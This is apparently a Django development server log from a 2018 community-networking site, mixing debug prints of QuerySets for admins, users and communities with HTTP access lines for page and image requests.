<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
<QuerySet [<Admins: Admins object (2)>]>
4
4
4
4
4
[<Requests: Requests object (4)>, <Requests: Requests object (3)>, <Requests: Requests object (5)>]
{}
: [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>[12/Dec/2018 12:03:16] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:03:40] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:03:49] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:03:50] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:03:51] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:03:51] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:03:54] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 12:03:54] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /creategroup/logo.jpeg
[12/Dec/2018 12:03:55] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5994
[12/Dec/2018 12:04:06] "GET /profile/4 HTTP/1.1" 200 17890
[12/Dec/2018 12:04:10] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:04:11] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:04:11] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:04:12] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:04:27] "GET /?data=Alumni&_=1544616250155 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:04:28] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:04:28] "GET /?data=Alumni&_=1544616250154 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:04:29] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:04:46] "GET /?data=Alumni&_=1544616250156 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:04:46] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:05:19] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:05:19] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:05:20] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:05:20] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:05:33] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:05:34] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:05:34] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:05:42] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:05:46] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:05:46] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:05:46] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:05:48] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:05:48] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:05:48] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:05:51] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 12:05:52] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:05:58] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:05:59] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:06:00] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:06:00] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:06:13] "GET /?data=Achievements&_=1544616358537 HTTP/1.1" 200 19
[12/Dec/2018 12:06:25] "GET /?data=Achi&_=1544616358538 HTTP/1.1" 200 19
[12/Dec/2018 12:07:28] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:07:28] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:07:29] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:07:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:07:31] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:07:31] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:07:32] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:07:40] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:07:43] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:07:44] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:07:44] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:28] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:09:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:29] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:09:32] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:09:33] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:33] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:09:40] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:09:41] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:41] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:09:43] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:09:44] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:09:44] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:44] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:09:50] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:09:50] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:09:50] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:10:46] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:10:47] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:10:50] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:10:51] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:10:51] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:10:53] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:10:54] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:10:55] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:10:55] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:10:58] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:10:58] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:10:59] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:11:05] "GET /community/4/members_list HTTP/1.1" 200 8316
[12/Dec/2018 12:11:05] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:11:10] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 12:11:10] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:11:11] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:11:50] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:11:51] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:11:51] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:11:51] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:09] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:12:09] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:09] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:11] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 12:12:12] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:14] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:12:15] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:12:15] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:12:16] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:16] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:19] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:12:20] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:12:21] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:21] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:28] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:12:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:29] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:43] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:12:44] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:12:44] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:12:52] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:13:08] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:13:08] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:08] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:17] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:13:18] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:13:18] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:18] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:31] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:13:31] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:13:32] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:32] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:35] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:13:35] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:13:36] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:36] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:40] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:13:40] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:40] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:45] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 12:13:46] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:46] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:13:55] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 12:13:56] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:13:56] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:14:02] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 12:14:03] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:14:03] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:14:03] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:14:09] "GET /?data=Alumni&_=1544616842144 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:14:09] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:14:26] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:14:27] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:14:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:14:28] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 12:14:29] "GET /media/media/logo.png HTTP/1.1" 304 0
[12/Dec/2018 12:14:29] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[12/Dec/2018 12:14:30] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[12/Dec/2018 12:14:30] "GET /logo.jpeg HTTP/1.1" 404 5958
[12/Dec/2018 12:14:33] "GET /?data=Startups&_=1544616865574 HTTP/1.1" 200 19

{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544616250155'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544616250154'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544616250156'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Achievements', '_': '1544616358537'}
<QuerySet []>
comm : []
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Achi', '_': '1544616358538'}
<QuerySet []>
comm : []
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544616842144'}
<QuerySet [<Category: Category object (3)>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Startups', '_': '1544616865574'}
<QuerySet []>
comm : []
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>[12/Dec/2018 12:14:35] "GET /?data=Alumni&_=1544616869439 HTTP/1.1" 200 211
Not Found: /http:/beta.collabmates.com//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:14:35] "GET http://beta.collabmates.com//media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 1871
[12/Dec/2018 12:14:45] "GET /?data=Alumni&_=1544616865575 HTTP/1.1" 200 211
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 12:14:46] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
[12/Dec/2018 12:14:53] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
